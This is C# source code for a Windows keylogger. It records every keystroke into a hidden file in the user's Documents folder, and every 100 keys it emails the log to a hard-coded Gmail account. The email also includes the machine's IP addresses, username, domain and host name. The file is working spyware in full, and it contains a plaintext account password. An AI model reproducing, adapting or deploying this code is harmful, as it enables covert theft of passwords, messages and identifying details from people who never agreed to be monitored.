using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Threading;

namespace Keylogger_1._0._0
{
    class Program
    {

        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        // string to hold all strokes
        static long numberOfKeystrokes = 0;

        static void Main(string[] args)
        {

            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }

            string path = (filepath + @"\keystrokes.txt");

            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {

                }
            }
            File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);

            // plan

            // 1 - capture keystrokes and display them to the console

            while (true)
            {
                // pause and let other programs get a chance to run
                Thread.Sleep(5);

                // check all keys for their state
                for (int i = 32; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);

                    // print to the console
                    if (keyState == 32769)
                    {
                        Console.Write((char) i + ", ");

                        // 2 - store the strokes into a text file

                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write((char) i);
                        }
                        numberOfKeystrokes++;

                        // send every 100/1000 characters

                        if (numberOfKeystrokes % 100 == 0)
                        {
                            SendNewMessage();
                        }
                    }
                }


                // 3 - periodically send the data through email
            }




        } // main

        static void SendNewMessage()
        {
            // send the data to the email specified

            String folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string filePath = folderName + @"\keystrokes.txt";

            String logContents = File.ReadAllText(filePath);
            string emailBody = "";


            // create email message

            DateTime now = DateTime.Now;
            string subject = "Message from keylogger";

            var host = Dns.GetHostEntry(Dns.GetHostName());

            foreach (var address in host.AddressList)
            {
                emailBody += "Address: " + address;
            }

            emailBody += "\nUser: " + Environment.UserDomainName + " \\ " + Environment.UserName;
            emailBody += "\nHost: " + host;
            emailBody += "\nTime: " + now.ToString();
            emailBody += logContents;

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            MailMessage mailMessage = new MailMessage();

            mailMessage.From = new MailAddress("jameslopezthebigone@gmail.com");
            mailMessage.To.Add("jameslopezthebigone@gmail.com");
            mailMessage.Subject = subject;
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("jameslopezthebigone@gmail.com", "E5/&$gB,/g=[");
            mailMessage.Body = emailBody;

            client.Send(mailMessage);

        }
    }
}
